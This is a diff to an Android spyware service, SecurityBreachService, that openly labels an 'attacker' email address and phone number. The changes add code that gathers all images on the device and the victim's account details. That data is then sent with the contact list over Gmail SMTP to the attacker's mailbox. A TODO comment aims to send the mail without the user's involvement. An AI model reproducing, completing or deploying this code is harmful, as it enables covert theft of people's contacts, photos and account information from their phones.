@@ -8,6 +8,7 @@ import javax.mail.internet.AddressException;
 
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
@@ -20,7 +21,7 @@ public class SecurityBreachService extends Service {
 	private static final String TAG = "SecurityBreachService";
 	private static final String attackerEmailId = "eyespies55@gmail.com";
 	private static final String attackerMobile = "1111111111";
-
+	
 	@Override
 	public IBinder onBind(Intent arg0) {
 		System.out.println("Binding.. !!");
@@ -42,7 +43,7 @@ public class SecurityBreachService extends Service {
 	
 	@Override
 	public void onStart(Intent intent, int startid) {
-		System.out.println("On start overrided");
+		System.out.println("On start overridden");
 	}
 
 	public int sendEmail() {
@@ -111,13 +112,18 @@ public class SecurityBreachService extends Service {
 	//TODO: Current version requires User's intervention, Send email without having to do so
 	private void sendMailToAddress(List<ContactInformation> contacts) {
 		String emailMessage = constructEmailMessage(contacts);
+	    List<String> imageList= new ArrayList<String>();
+	    Context context = getApplicationContext();
+	    imageList=	ImageLister.getAllImages(context);
+	    List<String> listOfAccounts = VictimAccountDetails.getAccount(context);
 		try {
-			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", emailMessage);
+			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", emailMessage, imageList,listOfAccounts);
 		} catch (AddressException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		} catch (MessagingException e) {
 			// TODO Auto-generated catch block
+			System.out.println("messaging exception" + e.getMessage());
 			e.printStackTrace();
 		}
 //		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
